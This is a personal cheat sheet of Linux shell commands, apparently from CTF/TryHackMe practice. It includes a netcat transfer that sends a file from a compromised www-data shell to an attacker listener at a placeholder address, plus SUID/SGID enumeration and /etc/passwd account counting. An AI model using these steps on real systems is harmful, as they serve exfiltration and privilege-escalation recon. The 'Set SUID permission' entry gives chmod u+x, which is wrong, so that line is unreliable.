# Fancy commands 

Some fancy command I forget time by time

## Table of Contents

- [Get my IP](#get-my-ip)
- [Copy from a certain line number until the end of the file](#copy-from-a-certain-line-number-until-the-end-of-the-file)
- [Generate a linux password](#generate-a-linux-password)
- [Count the number of accounts on a *nix box](#count-the-number-of-accounts-on-a-nix-box)
- [Pick up some 5 random lines of a file](#pick-up-some-5-random-lines-of-a-file)
- [Set SUID permission](#set-suid-permission)
- [Sorting a text file](#sorting-a-text-file)
- [Transfer a file with nc between 2 computers](#transfer-a-file-with-nc-between-2-computers)
- [Other things not classified](#other-things-not-classified)

## Get my IP

````commandline
hostname -I | awk '{print $1}'
````

## Copy from a certain line number until the end of the file

````commandline
sed -n '1792,$p' Hot_Babe.png > wordlist.txt
````

## Count the number of accounts on a *nix box

```commandline
gawk -F: '{ print $1 }' /etc/passwd | wc -l
```

N.B. User accounts are account with `uid` starting from `1000`.

## Pick up some 5 random lines of a file

```commandline
head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5 -
```

## Set SUID permission

```commandline
chmod u+x <filename>
```

## Sorting a text file

```commandline
sort to_sort.txt > sorted.txt
```

## Transfer a file with nc between 2 computers

Let say we have a file on the target machine we want to transfer to the host machine: For the fun, let's first create a file on the target machine with some meaningful content we want to transfer.

```commandline
echo "Foo says bla bla to Bar" > /tmp/foo-message.txt
```

Now, we first need to put a `NetCat` listener on the host (destination) and then send it from the target (source).

On the host (the destination, the listener):

```commandline
root@kali:~/tryhackme/startup# nc -l -p 9999 > foo-message.txt
```

On the target:

```commandline
www-data@startup:/incidents$ nc -w 3 <IP-DESTINATION> 9999 < foo-message.txt
```

Where `-w 3` is the time out in seconds. See `nc -h` for more info.

## Other things not classified

```commandline
┌──(itchy㉿scratchy)-[~]
└─$ ifconfig tun0 | grep -i 'inet ' | awk -F' ' '{print $2}'
10.8.208.30
```

Find all the SUID/SGID executables:

```commandline
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```commandline
while read line; do echo $line; done < clue.txt
```